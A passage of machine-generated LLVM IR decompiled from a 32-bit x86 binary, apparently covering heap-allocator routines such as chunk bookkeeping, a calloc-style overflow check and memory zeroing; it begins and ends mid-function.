  %v2_8050b91 = add i32 %v1_8050b91, %v0_8050b7f
  store i32 %v2_8050b91, i32* %eax.global-to-local, align 4
  %v1_8050b97 = load i32, i32* @global_var_80536b4.202, align 4
  %tmp134 = icmp ugt i32 %v2_8050b91, %v1_8050b97
  br i1 %tmp134, label %dec_label_pc_8050b9f, label %dec_label_pc_8050ba4

dec_label_pc_8050b9f:                             ; preds = %dec_label_pc_8050b91
  store i32 %v2_8050b91, i32* @global_var_80536b4.202, align 4
  br label %dec_label_pc_8050ba4

dec_label_pc_8050ba4:                             ; preds = %dec_label_pc_8050b91, %dec_label_pc_8050b9f
  %v0_8050ba4 = load i32, i32* @global_var_805336c.189, align 4
  store i32 %v0_8050ba4, i32* @ebx, align 4
  %v1_8050baa = add i32 %v0_8050ba4, 4
  %v2_8050baa = inttoptr i32 %v1_8050baa to i32*
  %v3_8050baa = load i32, i32* %v2_8050baa, align 4
  %v1_8050bad = and i32 %v3_8050baa, -4
  store i32 %v1_8050bad, i32* %ecx.global-to-local, align 4
  %v10_8050bb0 = icmp ult i32 %v1_8050bad, %v1_805084d
  br i1 %v10_8050bb0, label %dec_label_pc_8050c30, label %dec_label_pc_8050bb6

dec_label_pc_8050bb6:                             ; preds = %dec_label_pc_8050ba4
  store i32 %v1_80508d8, i32* %esi.global-to-local, align 4
  %v2_8050bbc = sub i32 %v1_8050bad, %v1_80508d8
  store i32 %v2_8050bbc, i32* %ecx.global-to-local, align 4
  %v2_8050bbe = add i32 %v0_8050ba4, %v1_80508d8
  store i32 %v2_8050bbe, i32* @edx, align 4
  %v1_8050bc1 = or i32 %v1_80508d8, 1
  store i32 %v1_8050bc1, i32* %eax.global-to-local, align 4
  store i32 %v2_8050bbe, i32* @global_var_805336c.189, align 4
  store i32 %v1_8050bc1, i32* %v2_8050baa, align 4
  %v0_8050bcd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050bcd

dec_label_pc_8050bcd:                             ; preds = %dec_label_pc_805085e, %dec_label_pc_8050bb6
  %v0_8050bcd = phi i32 [ %v5_8050871, %dec_label_pc_805085e ], [ %v0_8050bcd.pre, %dec_label_pc_8050bb6 ]
  %v1_8050bcd = or i32 %v0_8050bcd, 1
  store i32 %v1_8050bcd, i32* %ecx.global-to-local, align 4
  %v0_8050bd0 = load i32, i32* @ebx, align 4
  %v1_8050bd0 = add i32 %v0_8050bd0, 8
  store i32 %v1_8050bd0, i32* %ebx.global-to-local, align 4
  %v1_8050bd3 = load i32, i32* @edx, align 4
  %v2_8050bd3 = add i32 %v1_8050bd3, 4
  %v3_8050bd3 = inttoptr i32 %v2_8050bd3 to i32*
  store i32 %v1_8050bcd, i32* %v3_8050bd3, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_8050bd8:                             ; preds = %dec_label_pc_8050618
  %v5_8050bde = sub i32 %v1_80505fb, %v1_80508d8
  store i32 %v5_8050bde, i32* %eax.global-to-local, align 4
  %v2_8050be2 = add i32 %v1_8050bef, %v1_80508d8
  store i32 %v2_8050be2, i32* @edx, align 4
  %v1_8050be6 = or i32 %v1_80508d8, 1
  store i32 %v2_8050be2, i32* @global_var_8053370.190, align 16
  store i32 %v1_8050be6, i32* %v2_80505f5, align 4
  %v0_8050bf2 = load i32, i32* %eax.global-to-local, align 4
  %v0_8050bf4 = load i32, i32* @edx, align 4
  store i32 %v0_8050bf4, i32* @global_var_805337c.207, align 4
  %v1_8050bfa = or i32 %v0_8050bf2, 1
  store i32 %v1_8050bfa, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050bf4, i32* @global_var_8053380.192, align 128
  %v1_8050c03 = add i32 %v0_8050bf4, 8
  %v2_8050c03 = inttoptr i32 %v1_8050c03 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_8050c03, align 4
  %v0_8050c0a = load i32, i32* @edx, align 4
  %v1_8050c0a = add i32 %v0_8050c0a, 12
  %v2_8050c0a = inttoptr i32 %v1_8050c0a to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_8050c0a, align 4
  %v0_8050c11 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c11 = load i32, i32* @edx, align 4
  %v2_8050c11 = add i32 %v1_8050c11, 4
  %v3_8050c11 = inttoptr i32 %v2_8050c11 to i32*
  store i32 %v0_8050c11, i32* %v3_8050c11, align 4
  %v0_8050c14 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c14 = load i32, i32* @edx, align 4
  %v3_8050c14 = add i32 %v1_8050c14, %v0_8050c14
  %v4_8050c14 = inttoptr i32 %v3_8050c14 to i32*
  store i32 %v0_8050c14, i32* %v4_8050c14, align 4
  br label %dec_label_pc_8050c22

dec_label_pc_8050c19:                             ; preds = %dec_label_pc_8050627
  store i32 %v1_80508d8, i32* %ebx.global-to-local, align 4
  %v0_8050c1d = load i32, i32* @ebp, align 4
  %v2_8050c1d = or i32 %v1_80508d8, 4
  %v3_8050c1d = add i32 %v0_8050c1d, %v2_8050c1d
  %v4_8050c1d = inttoptr i32 %v3_8050c1d to i32*
  %v5_8050c1d = load i32, i32* %v4_8050c1d, align 4
  %v6_8050c1d = or i32 %v5_8050c1d, 1
  store i32 %v6_8050c1d, i32* %v4_8050c1d, align 4
  br label %dec_label_pc_8050c22

dec_label_pc_8050c22:                             ; preds = %dec_label_pc_8050bd8, %dec_label_pc_8050c19
  %v0_8050c22 = load i32, i32* @ebp, align 4
  %v1_8050c22 = add i32 %v0_8050c22, 8
  store i32 %v1_8050c22, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_8050c27:                             ; preds = %dec_label_pc_8050717
  %v1_8050c27 = load i32, i32* @ebx, align 4
  %v2_8050c27 = add i32 %v0_8050726, 4
  %v3_8050c27 = add i32 %v2_8050c27, %v1_8050c27
  %v4_8050c27 = inttoptr i32 %v3_8050c27 to i32*
  %v5_8050c27 = load i32, i32* %v4_8050c27, align 4
  %v6_8050c27 = or i32 %v5_8050c27, 1
  store i32 %v6_8050c27, i32* %v4_8050c27, align 4
  br label %dec_label_pc_8050c2c

dec_label_pc_8050c2c:                             ; preds = %dec_label_pc_805072f, %dec_label_pc_8050c27
  %v0_8050c2c = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8050c2c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_8050c30:                             ; preds = %dec_label_pc_80509ee, %dec_label_pc_8050ba4, %dec_label_pc_80509f8
  %v0_8050c30 = load i32, i32* %stack_var_-92, align 4
  %v1_8050c30 = call i32 @function_8050089(i32 %v0_8050c30)
  store i32 %v1_8050c30, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050c37 = inttoptr i32 %v1_8050c30 to i32*
  store i32 12, i32* %v1_8050c37, align 4
  br label %dec_label_pc_8050c3d

dec_label_pc_8050c3d:                             ; preds = %dec_label_pc_8050c2c, %dec_label_pc_8050c22, %dec_label_pc_8050bcd, %dec_label_pc_8050889, %dec_label_pc_805083b, %dec_label_pc_80505c2, %dec_label_pc_8050c30
  store i32 %v2_80504f9, i32* @eax, align 4
  store i32 %v2_80504f9, i32* %stack_var_-92, align 4
  %v2_8050c46 = call i32 @function_8051a10(i32 %v2_80504f9, i32 1)
  store i32 %v2_8050c46, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c4e

dec_label_pc_8050c4e:                             ; preds = %dec_label_pc_8050517, %dec_label_pc_8050c3d
  %v0_8050c51 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050c51, i32* %eax.global-to-local, align 4
  store i32 %v0_80504e6, i32* @esi, align 4
  store i32 %v0_80504e5, i32* @edi, align 4
  store i32 %v0_80504e4, i32* @ebp, align 4
  ret i32 %v0_8050c51

; uselistorder directives
  uselistorder i32 %v0_8050c14, { 1, 0 }
  uselistorder i32 %v0_8050bf4, { 1, 0, 2 }
  uselistorder i32 %v2_8050b91, { 1, 0, 2 }
  uselistorder i32 %v0_8050b7f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050b16, { 1, 0 }
  uselistorder i32 %v2_8050b04, { 1, 0 }
  uselistorder i32 %v1_8050abb, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8050aa5, { 1, 0, 2 }
  uselistorder i32 %v2_8050a99, { 1, 2, 0 }
  uselistorder i32 %v2_8050a94, { 1, 0, 2 }
  uselistorder i32 %v1_8050a84, { 2, 1, 0 }
  uselistorder i8 %v0_8050a52, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8050a35, { 1, 0, 2 }
  uselistorder i32 %v0_8050ae993, { 2, 0, 1 }
  uselistorder i32 %v0_8050af794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8050a2f, { 2, 1, 0 }
  uselistorder i32 %v8_8050a05, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8050a02, { 1, 0 }
  uselistorder i32 %v0_80509e1, { 1, 0 }
  uselistorder i32 %v2_80509b2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80509aa, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8050997, { 1, 0 }
  uselistorder i1 %v2_805098e, { 2, 1, 0 }
  uselistorder i32 %v1_805098e, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_805097b, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_805095f, { 1, 0, 2 }
  uselistorder i32 %v2_805094b, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050914, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050908, { 2, 1, 0 }
  uselistorder i32 %v8_80508f7, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_80508de, { 1, 0, 2 }
  uselistorder i32 %v0_805087a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805084d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8050843, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8050835, { 1, 0 }
  uselistorder i32 %v1_80507cc, { 1, 0 }
  uselistorder i32 %v3_80507c0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_80507d0, { 1, 0 }
  uselistorder i32 %v2_80507ba, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80507b77, { 1, 0 }
  uselistorder i32 %v2_80507ac, { 1, 0 }
  uselistorder i32 %v1_8050790, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805078c, { 2, 1, 0 }
  uselistorder i32 %v1_8050788, { 1, 0 }
  uselistorder i32 %v1_805077c, { 2, 1, 0 }
  uselistorder i32 %v2_8050772, { 1, 0 }
  uselistorder i32 %v1_805076f, { 1, 2, 0 }
  uselistorder i32 %v4_805070d, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8050758, { 1, 0 }
  uselistorder i32 %v0_8050726, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80506f9, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80506c6, { 0, 2, 1 }
  uselistorder i32 %v2_80506aa, { 1, 0 }
  uselistorder i32 %v1_80506a0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_805069b.lcssa, { 1, 0 }
  uselistorder i32 %v3_805068b, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8050682, { 1, 0, 2 }
  uselistorder i32 %v2_805065e, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8050646, { 2, 1, 0 }
  uselistorder i32 %v0_8050632, { 2, 0, 3, 1 }
  uselistorder i32 %v3_80505f8, { 1, 0, 2 }
  uselistorder i32 %v1_8050bef, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80506c69, { 1, 0, 2 }
  uselistorder i32 %v3_80505a5, { 1, 0, 2 }
  uselistorder i32 %v2_8050597, { 2, 1, 0 }
  uselistorder i32 %v2_8050572, { 2, 1, 0 }
  uselistorder i8 %v0_8050540, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_80508d8, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8050529, { 0, 2, 1 }
  uselistorder i32 %v0_8050512, { 1, 0 }
  uselistorder i32 %v2_80504f9, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 0, 1, 2, 3, 4, 5, 6, 7, 15, 8, 16, 9, 10, 11, 12, 13, 14, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80536a0.204, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8051d28, { 1, 0 }
  uselistorder i32 134558580, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8053380.192, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_80504be, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805336c.189 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805336c.189 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8050c4e, { 1, 0 }
  uselistorder label %dec_label_pc_8050c3d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050c30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050c2c, { 1, 0 }
  uselistorder label %dec_label_pc_8050c22, { 1, 0 }
  uselistorder label %dec_label_pc_8050bcd, { 1, 0 }
  uselistorder label %dec_label_pc_8050ba4, { 1, 0 }
  uselistorder label %dec_label_pc_8050b91, { 1, 0 }
  uselistorder label %dec_label_pc_8050b7f, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050b11, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8050af0, { 1, 0 }
  uselistorder label %dec_label_pc_8050a99, { 1, 0 }
  uselistorder label %dec_label_pc_8050a82, { 1, 0 }
  uselistorder label %dec_label_pc_8050a6b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80509ee, { 1, 0 }
  uselistorder label %dec_label_pc_80509e1, { 1, 0 }
  uselistorder label %dec_label_pc_80509a2, { 1, 0 }
  uselistorder label %dec_label_pc_805097b, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805095f, { 1, 0 }
  uselistorder label %dec_label_pc_8050946, { 1, 0 }
  uselistorder label %dec_label_pc_8050928, { 1, 0 }
  uselistorder label %dec_label_pc_8050843, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805083b, { 1, 0 }
  uselistorder label %dec_label_pc_8050824, { 1, 0 }
  uselistorder label %dec_label_pc_80507b7, { 1, 0 }
  uselistorder label %dec_label_pc_80507bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050790, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050717, { 1, 0 }
  uselistorder label %dec_label_pc_80506c6, { 1, 0 }
  uselistorder label %dec_label_pc_805069e, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050687, { 1, 0 }
  uselistorder label %dec_label_pc_80505f5, { 1, 0 }
  uselistorder label %dec_label_pc_80506c6.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80505c2, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8050540, { 1, 0 }
}

define i32 @function_8050c58(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050c58:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8050c58 = load i32, i32* @edi, align 4
  %v0_8050c5a = load i32, i32* @ebx, align 4
  %v12_8050c5b = ptrtoint i32* %stack_var_-28 to i32
  %v4_8050c5e = trunc i64 %arg1 to i32
  store i32 %v4_8050c5e, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8050c68 = sdiv i64 %sext, 4294967296
  %v3_8050c68 = sext i32 %arg2 to i64
  %v4_8050c68 = mul nsw i64 %v3_8050c68, %v2_8050c68
  %v5_8050c68 = trunc i64 %v4_8050c68 to i32
  store i32 %v5_8050c68, i32* @ebx, align 4
  %v2_8050c6b = icmp eq i32 %v4_8050c5e, 0
  br i1 %v2_8050c6b, label %dec_label_pc_8050c8d, label %dec_label_pc_8050c6f

dec_label_pc_8050c6f:                             ; preds = %dec_label_pc_8050c58
  store i32 %v4_8050c5e, i32* @edi, align 4
  %div = udiv i32 %v5_8050c68, %v4_8050c5e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp15 = urem i32 %v5_8050c68, %v4_8050c5e
  store i32 %tmp15, i32* @edx, align 4
  %v12_8050c77 = icmp eq i32 %div, %arg2
  br i1 %v12_8050c77, label %dec_label_pc_8050c8d, label %dec_label_pc_8050c7b

dec_label_pc_8050c7b:                             ; preds = %dec_label_pc_8050c6f
  %v1_8050c7b = call i32 @function_8050089(i32 %v0_8050c5a)
  store i32 %v1_8050c7b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050c82 = inttoptr i32 %v1_8050c7b to i32*
  store i32 12, i32* %v1_8050c82, align 4
  br label %dec_label_pc_8050d43

dec_label_pc_8050c8d:                             ; preds = %dec_label_pc_8050c6f, %dec_label_pc_8050c58
  store i32 %v12_8050c5b, i32* @eax, align 4
  %v2_8050c9d = call i32 @function_8051a10(i32 %v12_8050c5b, i32 134552077)
  store i32 %v2_8050c9d, i32* %eax.global-to-local, align 4
  %v1_8050ca9 = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_805303c.187 to i32))
  store i32 %v1_8050ca9, i32* %eax.global-to-local, align 4
  %v0_8050cae = load i32, i32* @ebx, align 4
  %v1_8050cb1 = call i32 @function_80504e4(i32 %v0_8050cae)
  store i32 %v1_8050cb1, i32* %eax.global-to-local, align 4
  store i32 %v1_8050cb1, i32* %ebx.global-to-local, align 4
  %v1_8050cbb = icmp eq i32 %v1_8050cb1, 0
  br i1 %v1_8050cbb, label %dec_label_pc_8050d32, label %dec_label_pc_8050cbf

dec_label_pc_8050cbf:                             ; preds = %dec_label_pc_8050c8d
  %v1_8050cbf = add i32 %v1_8050cb1, -4
  %v2_8050cbf = inttoptr i32 %v1_8050cbf to i32*
  %v3_8050cbf = load i32, i32* %v2_8050cbf, align 4
  store i32 %v3_8050cbf, i32* %eax.global-to-local, align 4
  %v2_8050cc2 = and i32 %v3_8050cbf, 2
  %v3_8050cc2 = icmp eq i32 %v2_8050cc2, 0
  %v1_8050cc4 = icmp eq i1 %v3_8050cc2, false
  br i1 %v1_8050cc4, label %dec_label_pc_8050d32, label %dec_label_pc_8050cc6

dec_label_pc_8050cc6:                             ; preds = %dec_label_pc_8050cbf
  %v1_8050cc64 = add i32 %v3_8050cbf, -4
  %v1_8050cc9 = and i32 %v1_8050cc64, -4
  store i32 %v1_8050cc9, i32* @edx, align 4
  %v2_8050cce = udiv i32 %v1_8050cc9, 4
  store i32 %v2_8050cce, i32* %eax.global-to-local, align 4
  %v5_8050cd1 = icmp ult i32 %v1_8050cc9, 36
  %tmp = and i32 %v1_8050cc64, -4
  %tmp19 = icmp eq i32 %tmp, 36
  %v2_8050cd4 = or i1 %v5_8050cd1, %tmp19
  br i1 %v2_8050cd4, label %dec_label_pc_8050ce5, label %dec_label_pc_8050cd6

dec_label_pc_8050cd6:                             ; preds = %dec_label_pc_8050cc6
  %v3_8050cdb = inttoptr i32 %v1_8050cb1 to i8*
  %v4_8050cdb = call i32 @function_80500da(i8* %v3_8050cdb, i32 0, i32 %v1_8050cc9)
  store i32 %v4_8050cdb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d32

dec_label_pc_8050ce5:                             ; preds = %dec_label_pc_8050cc6
  %v1_8050ce5 = inttoptr i32 %v1_8050cb1 to i32*
  store i32 0, i32* %v1_8050ce5, align 4
  %v0_8050ceb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ceb = add i32 %v0_8050ceb, 4
  %v2_8050ceb = inttoptr i32 %v1_8050ceb to i32*
  store i32 0, i32* %v2_8050ceb, align 4
  %v0_8050cf2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050cf2 = add i32 %v0_8050cf2, 8
  %v2_8050cf2 = inttoptr i32 %v1_8050cf2 to i32*
  store i32 0, i32* %v2_8050cf2, align 4
  %v0_8050cf9 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_8050cf9, 5
  br i1 %tmp16, label %dec_label_pc_8050d32, label %dec_label_pc_8050cfe

dec_label_pc_8050cfe:                             ; preds = %dec_label_pc_8050ce5
  %v0_8050cfe = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050cfe = add i32 %v0_8050cfe, 12
  %v2_8050cfe = inttoptr i32 %v1_8050cfe to i32*
  store i32 0, i32* %v2_8050cfe, align 4
  %v0_8050d05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d05 = add i32 %v0_8050d05, 16
  %v2_8050d05 = inttoptr i32 %v1_8050d05 to i32*
  store i32 0, i32* %v2_8050d05, align 4
  %v0_8050d0c = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8050d0c, 7
  br i1 %tmp17, label %dec_label_pc_8050d32, label %dec_label_pc_8050d11

dec_label_pc_8050d11:                             ; preds = %dec_label_pc_8050cfe
  %v0_8050d11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d11 = add i32 %v0_8050d11, 20
  %v2_8050d11 = inttoptr i32 %v1_8050d11 to i32*
  store i32 0, i32* %v2_8050d11, align 4
  %v0_8050d18 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d18 = add i32 %v0_8050d18, 24
  %v2_8050d18 = inttoptr i32 %v1_8050d18 to i32*
  store i32 0, i32* %v2_8050d18, align 4
  %v0_8050d1f = load i32, i32* %eax.global-to-local, align 4
  %tmp18 = icmp ult i32 %v0_8050d1f, 9
  br i1 %tmp18, label %dec_label_pc_8050d32, label %dec_label_pc_8050d24

dec_label_pc_8050d24:                             ; preds = %dec_label_pc_8050d11
  %v0_8050d24 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d24 = add i32 %v0_8050d24, 28
  %v2_8050d24 = inttoptr i32 %v1_8050d24 to i32*
  store i32 0, i32* %v2_8050d24, align 4
  %v0_8050d2b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d2b = add i32 %v0_8050d2b, 32
  %v2_8050d2b = inttoptr i32 %v1_8050d2b to i32*
  store i32 0, i32* %v2_8050d2b, align 4
  br label %dec_label_pc_8050d32

dec_label_pc_8050d32:                             ; preds = %dec_label_pc_8050d11, %dec_label_pc_8050cfe, %dec_label_pc_8050ce5, %dec_label_pc_8050cbf, %dec_label_pc_8050c8d, %dec_label_pc_8050cd6, %dec_label_pc_8050d24
  store i32 %v12_8050c5b, i32* @eax, align 4
  %v2_8050d3b = call i32 @function_8051a10(i32 %v12_8050c5b, i32 1)
  store i32 %v2_8050d3b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d43

dec_label_pc_8050d43:                             ; preds = %dec_label_pc_8050c7b, %dec_label_pc_8050d32
  %v0_8050d46 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050d46, i32* %eax.global-to-local, align 4
  store i32 %v0_8050c5a, i32* @ebx, align 4
  store i32 %v0_8050c58, i32* @edi, align 4
  ret i32 %v0_8050d46

; uselistorder directives
  uselistorder i32 %v1_8050cc9, { 3, 2, 0, 1 }
  uselistorder i32 %v1_8050cb1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8050c68, { 1, 0, 2 }
  uselistorder i32 %v4_8050c5e, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050d43, { 1, 0 }
  uselistorder label %dec_label_pc_8050d32, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8050d4c() local_unnamed_addr {
dec_label_pc_8050d4c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8050d4c = load i32, i32* @ebp, align 4
  %v0_8050d4d = load i32, i32* @edi, align 4
  %v0_8050d4e = load i32, i32* @esi, align 4
  %v0_8050d4f = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8050d57 = icmp eq i32 %tmp6, 0
  %v1_8050d5c = icmp eq i1 %v4_8050d57, false
  br i1 %v1_8050d5c, label %dec_label_pc_8050d6e, label %dec_label_pc_8050d5e

dec_label_pc_8050d5e:                             ; preds = %dec_label_pc_8050d4c
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050d62 = call i32 @function_80504e4(i32 %tmp7)
  store i32 %v1_8050d62, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d62, i32* @ebx, align 4
  br label %dec_label_pc_8051067

dec_label_pc_8050d6e:                             ; preds = %dec_label_pc_8050d4c
  %v1_8050d6e = icmp eq i32 %tmp7, 0
  %v1_8050d70 = icmp eq i1 %v1_8050d6e, false
  br i1 %v1_8050d70, label %dec_label_pc_8050d83, label %dec_label_pc_8050d72

dec_label_pc_8050d72:                             ; preds = %dec_label_pc_8050d6e
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8050d79 = call i32 @function_80512a9(i32 %tmp6)
  store i32 %v1_8050d79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051067

dec_label_pc_8050d83:                             ; preds = %dec_label_pc_8050d6e
  %v2_8050d8e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050d8e, i32* @eax, align 4
  store i32 %v2_8050d8e, i32* %stack_var_-60, align 4
  %v2_8050d93 = call i32 @function_8051a10(i32 %v2_8050d8e, i32 134552077)
  store i32 %v2_8050d93, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805303c.187 to i32), i32* %stack_var_-60, align 4
  %v1_8050d9f = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_805303c.187 to i32))
  store i32 %v1_8050d9f, i32* %eax.global-to-local, align 4
  %v0_8050da7 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_8050da7, -32
  br i1 %tmp19, label %dec_label_pc_8050dbe, label %dec_label_pc_8050dac

dec_label_pc_8050dac:                             ; preds = %dec_label_pc_8050d83
  %v0_8050dac = load i32, i32* %stack_var_-60, align 4
  %v1_8050dac = call i32 @function_8050089(i32 %v0_8050dac)
  store i32 %v1_8050dac, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050db3 = inttoptr i32 %v1_8050dac to i32*
  store i32 12, i32* %v1_8050db3, align 4
  br label %dec_label_pc_805106a

dec_label_pc_8050dbe:                             ; preds = %dec_label_pc_8050d83
  %v1_8050dbe = add i32 %v0_8050da7, 11
  %tmp20 = icmp ult i32 %v1_8050dbe, 16
  br i1 %tmp20, label %dec_label_pc_8050dd5, label %dec_label_pc_8050dce

dec_label_pc_8050dce:                             ; preds = %dec_label_pc_8050dbe
  %v1_8050dce = and i32 %v1_8050dbe, -8
  br label %dec_label_pc_8050dd5

dec_label_pc_8050dd5:                             ; preds = %dec_label_pc_8050dbe, %dec_label_pc_8050dce
  %stack_var_-40.0 = phi i32 [ %v1_8050dce, %dec_label_pc_8050dce ], [ 16, %dec_label_pc_8050dbe ]
  %storemerge26 = phi i32 [ %v1_8050dce, %dec_label_pc_8050dce ], [ %v1_8050dbe, %dec_label_pc_8050dbe ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_8050dd9 = add i32 %tmp6, -8
  store i32 %v1_8050dd9, i32* @edi, align 4
  %v1_8050ddc = add i32 %tmp6, -4
  %v2_8050ddc = inttoptr i32 %v1_8050ddc to i32*
